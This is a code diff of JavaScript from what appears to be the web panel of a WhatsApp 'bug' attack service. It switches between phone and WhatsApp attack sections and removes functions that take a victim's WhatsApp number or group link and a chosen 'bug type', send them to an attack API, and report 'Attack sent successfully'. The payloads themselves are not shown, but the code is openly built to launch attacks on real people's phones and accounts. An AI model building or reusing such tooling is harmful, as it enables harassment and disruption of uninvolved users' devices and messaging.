@@ -771,7 +771,7 @@ function switchAttackType(type) {
   const phoneSection = document.getElementById('phoneAttackSection');
   const whatsappSection = document.getElementById('whatsappAttackSection');
   
-  if (type === 'android') {
+  if (type === 'phone') {
     phoneSection.classList.remove('hidden');
     whatsappSection.classList.add('hidden');
   } else {
@@ -782,94 +782,4 @@ function switchAttackType(type) {
   // Clear previous results
   document.getElementById('attackResult').innerHTML = '';
   checkApiConnection();
-}
-
-// Tab switching
-function switchTab(tabId) {
-  document.querySelectorAll('.tab-btn').forEach(btn => {
-    btn.classList.toggle('active', btn.getAttribute('onclick').includes(tabId));
-  });
-  
-  document.querySelectorAll('.tab-content').forEach(content => {
-    content.classList.toggle('hidden', content.id !== tabId + 'Section');
-  });
-}
-
-// WhatsApp Number Attack
-async function launchWhatsAppNumberAttack() {
-  const number = document.getElementById('whatsappNumber').value.trim();
-  const bugType = document.getElementById('bugType').value;
-  
-  if (!number) {
-    alert('Please enter WhatsApp number');
-    return;
-  }
-  
-  showAttackAnimation(`Attacking ${number}...`);
-  
-  try {
-    const response = await fetch(`${ATTACK_API_URL}?number=${encodeURIComponent(number)}&type=${bugType}`);
-    const result = await response.json();
-    
-    if (result.success) {
-      showAttackResult('success', `Attack sent to ${number} successfully!`);
-    } else {
-      showAttackResult('error', result.message || 'Attack failed');
-    }
-  } catch (error) {
-    showAttackResult('error', `Error: ${error.message}`);
-  }
-}
-
-// WhatsApp Group Attack
-async function launchWhatsAppGroupAttack() {
-  const groupLink = document.getElementById('whatsappGroupLink').value.trim();
-  const bugType = document.getElementById('groupBugType').value;
-  
-  if (!groupLink) {
-    alert('Please enter WhatsApp group link');
-    return;
-  }
-  
-  showAttackAnimation(`Attacking group...`);
-  
-  try {
-    const response = await fetch(`${ATTACK_API_URL}?group=${encodeURIComponent(groupLink)}&type=${bugType}`);
-    const result = await response.json();
-    
-    if (result.success) {
-      showAttackResult('success', `Group attack sent successfully!`);
-    } else {
-      showAttackResult('error', result.message || 'Group attack failed');
-    }
-  } catch (error) {
-    showAttackResult('error', `Error: ${error.message}`);
-  }
-}
-
-// Animation functions
-function showAttackAnimation(message) {
-  const animation = document.getElementById('attackAnimation');
-  animation.innerHTML = `
-    <div class="attack-animation-content">
-      <i class="fas fa-bug fa-spin" style="font-size: 3rem; margin-bottom: 20px;"></i>
-      <div>${message}</div>
-    </div>
-  `;
-  animation.classList.remove('hidden');
-}
-
-function showAttackResult(type, message) {
-  const animation = document.getElementById('attackAnimation');
-  animation.innerHTML = `
-    <div class="attack-animation-content">
-      <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-times-circle'}" 
-         style="font-size: 3rem; margin-bottom: 20px; color: ${type === 'success' ? 'var(--main)' : '#f44336'};"></i>
-      <div>${message}</div>
-      <button class="btn" onclick="document.getElementById('attackAnimation').classList.add('hidden')" 
-              style="margin-top: 20px;">
-        <i class="fas fa-times"></i> Close
-      </button>
-    </div>
-  `;
 }
